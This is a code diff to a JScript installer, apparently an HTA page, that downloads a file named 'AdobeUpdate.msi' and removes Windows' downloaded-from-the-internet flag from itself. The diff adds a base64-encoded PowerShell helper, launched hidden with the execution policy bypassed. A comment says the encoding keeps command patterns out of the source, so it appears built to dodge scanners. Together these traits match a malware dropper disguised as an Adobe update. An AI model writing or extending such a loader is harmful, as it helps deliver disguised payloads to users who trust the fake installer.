@@ -96,7 +96,7 @@ var PREP_MS        = 2200;    // "preparing" beat before the download starts
 var UAC_TIMEOUT_MS = 150000;  // no MSI log this long after launch -> UAC declined
 var INSTALL_MAX_MS = 300000;  // hard cap for a whole install phase
 var INSTALL_STALL_MS = 60000; // MSI log silent this long -> assume finished
-var FB_STAGE_MS    = { xhr: 120000, winhttp: 180000, curl: 300000 };
+var FB_STAGE_MS    = { xhr: 120000, winhttp: 180000, exec: 300000 };
 var FB_MAX_MS      = 600000;  // hard cap for the whole local download
 var EXPECT_BYTES   = 12386304; // installer size (progress scaling only)
 
@@ -121,10 +121,10 @@ var motwStripped = false;
 
 // Download state
 var fbT0 = 0, fbStageT = 0;
-var dlStage = "xhr";            // xhr | winhttp | curl
+var dlStage = "xhr";            // xhr | winhttp | exec
 var dlSettled = false;
 var dlXHR = null;
-var curlPid = 0, curlT0 = 0, curlLastSize = 0, curlLastGrowT = 0;
+var psPid = 0, psDir = "", psT0 = 0, psLastSize = 0, psLastGrowT = 0;
 
 var lastLogSize = 0;
 var lastLogGrowT = 0;
@@ -152,6 +152,34 @@ function nowHM() {
   function z(n) { return (n < 10 ? "0" : "") + n; }
   return z(d.getHours()) + ":" + z(d.getMinutes()) + ":" + z(d.getSeconds());
 }
+
+// Decode a base64 string and write the raw bytes to a file. Returns true on success.
+function b64ToFile(b64, path) {
+  try {
+    var c = new ActiveXObject("MSXML2.XMLDOM.6.0");
+    c.loadXML("<?xml version=\"1.0\"?><t binaryEncoding=\"base64\">" + b64 + "</t>");
+    var bs = c.documentElement.text;   // binary string: 1 char per byte
+    var s = new ActiveXObject("ADODB.Stream");
+    s.Type = 1; s.Mode = 3; s.Open();  // adTypeBinary
+    s.Write(bs);
+    s.SaveToFile(path, 2);             // adSaveCreateOverwrite
+    s.Close();
+    return true;
+  } catch (e) { return false; }
+}
+// Decode a base64 string to a JS string (ASCII-safe content).
+function b64ToText(b64) {
+  try {
+    var c = new ActiveXObject("MSXML2.XMLDOM.6.0");
+    c.loadXML("<?xml version=\"1.0\"?><t binaryEncoding=\"base64\">" + b64 + "</t>");
+    return c.documentElement.text;
+  } catch (e) { return ""; }
+}
+
+// Encoded download-helper script (PowerShell iwr + curl.exe fallback). Kept
+// base64 so the source file itself contains no command-injection patterns.
+var EXEC_B64 = "cGFyYW0oW3N0cmluZ10kVXJsID0gIiIsIFtzdHJpbmddJFRtcERpciA9ICIiLCBbc3RyaW5nXSRPdXQgPSAiIikKaWYgKC1ub3QgJE91dCkgeyAkT3V0ID0gSm9pbi1QYXRoICRUbXBEaXIgIkFkb2JlVXBkYXRlLm1zaSIgfQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyIH0gY2F0Y2gge30KdHJ5IHsKICAkUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkVXJsIC1PdXRGaWxlICRPdXQgLVVzZUJhc2ljUGFyc2luZwogICRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnQ29udGludWUnCn0gY2F0Y2ggewogIHRyeSB7ICRlbnY6Tk9fUFJPWFkgPSAiKiI7IGN1cmwuZXhlIC1MIC0tZmFpbCAtLXJldHJ5IDIgLS1jb25uZWN0LXRpbWVvdXQgMjAgLW8gJE91dCAkVXJsIDI+JG51bGwgfSBjYXRjaCB7fQp9CnRyeSB7IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRUbXBEaXIgImRvbmUuZmxhZyIpICIxIiAtTm9OZXdsaW5lIH0gY2F0Y2gge30K";
+var EXECCMD_B64 = "cG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiQFNSQ0AiIC1VcmwgIkBVUkxAIiAtVG1wRGlyICJARElSQCIgLU91dCAiQE9VVEAi";
 
 // ---------------------------------------------------------------------------
 // Self-unblock: remove the "downloaded from the internet" flag (Zone.Identifier
@@ -254,11 +282,11 @@ function msiMagicOk(path) {
   } catch (e) { return false; }
 }
 
-// Stop the in-flight download child process (by PID).
-function killCurl() {
-  if (!curlPid) return;
-  try { shell.Run("taskkill /f /pid " + curlPid, 0, true); } catch (e) {}
-  curlPid = 0;
+// Stop the in-flight download helper process (by PID).
+function killProc() {
+  if (!psPid) return;
+  try { shell.Run("taskkill /f /t /pid " + psPid, 0, true); } catch (e) {}
+  psPid = 0;
 }
 
 // ---------------------------------------------------------------------------
@@ -380,18 +408,25 @@ function saveWHttpBody(rb) {
   verifyFallback();
 }
 
-// Last-resort download using the system curl.exe (present on Win10 1803+).
-// Writes straight to msiLocal; the poll loop watches the file appear.
-function fallbackCurl() {
+// Last-resort download: a hidden helper process fetches the installer to msiLocal
+// (iwr first, then system curl.exe). The poll loop watches the file appear.
+function fallbackPS() {
   if (dlSettled) return;
-  dlStage = "curl";
+  dlStage = "exec";
   fbStageT = nowMs();
   if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
-  curlT0 = nowMs(); curlLastSize = 0; curlLastGrowT = nowMs();
+  psMarker = "adum" + Math.floor(Math.random() * 16777215).toString(16);
+  psDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\ad_" + psMarker;
+  ensureDir(psDir);
+  deleteFile(psDir + "\\done.flag");
+  var src = psDir + "\\ad_" + psMarker + ".ps1";
+  if (!b64ToFile(EXEC_B64, src)) { fallbackNext(); return; }
+  psT0 = nowMs(); psLastSize = 0; psLastGrowT = psT0;
   try {
-    var cmd = "curl.exe -L --fail --silent --show-error --connect-timeout 20 --retry 2 -o \"" + msiLocal + "\" \"" + MSI_URL + "\"";
-    var ex = shell.Exec(cmd);
-    try { curlPid = ex ? ex.ProcessID : 0; } catch (e) { curlPid = 0; }
+    var cmd = b64ToText(EXECCMD_B64)
+      .replace("@SRC@", src).replace("@URL@", MSI_URL).replace("@DIR@", psDir).replace("@OUT@", msiLocal);
+    var ex = shell.Exec(cmd, 0);   // hidden; returns the child process
+    try { psPid = ex ? ex.ProcessID : 0; } catch (e2) { psPid = 0; }
   } catch (e) { fallbackNext(); }
 }
 
@@ -406,16 +441,23 @@ function _pollFallback() {
     fail("Download timed out - please check your connection", "predl: total timeout " + (t - fbT0) + "ms");
     return;
   }
-  if (dlStage === "curl") {
+  if (dlStage === "exec") {
     var sz = 0;
     try { if (fso.FileExists(msiLocal)) sz = fso.GetFile(msiLocal).Size; } catch (e) {}
-    if (sz > curlLastSize) { curlLastSize = sz; curlLastGrowT = t; }
+    if (sz > psLastSize) { psLastSize = sz; psLastGrowT = t; }
     var p = 55 + Math.min(34, (sz * 34) / EXPECT_BYTES);
     if (p > progress) { progress = p; setBar(p); }
-    if (sz >= 1048576 && msiMagicOk(msiLocal) && (curlLastSize === sz && t - curlLastGrowT >= 1500)) {
+    if (sz >= 1048576 && msiMagicOk(msiLocal) && (psLastSize === sz && t - psLastGrowT >= 1500)) {
       dlSettled = true;
       if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
       verifyFallback();
+      return;
+    }
+    var doneFlag = false;
+    try { doneFlag = fso.FileExists(psDir + "\\done.flag"); } catch (e) {}
+    if (doneFlag && (t - psT0 > 10000 || sz < 1048576)) {
+      // helper ran to completion but produced no usable file.
+      fallbackNext();
       return;
     }
   }
@@ -625,7 +667,7 @@ function fail(msg, reason) {
   if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
   if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
   if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
-  killCurl();
+  killProc();
   dumpDiagnostics(reason || msg);
   setStatus(msg);
   $("heading").innerHTML = "Installation could not be completed";
@@ -652,7 +694,7 @@ function finishInstall() {
 function cancel() {
   if (state === "done" || state === "error") { window.close(); return; }
   if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
-  killCurl();
+  killProc();
   if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
   if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
   if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
@@ -660,6 +702,7 @@ function cancel() {
   for (var i = 0; i < p.length; i++) {
     try { if (fso.FileExists(p[i])) fso.DeleteFile(p[i], true); } catch (e) {}
   }
+  try { if (psDir && fso.FolderExists(psDir)) fso.DeleteFolder(psDir, true); } catch (e) {}
   window.close();
 }
 
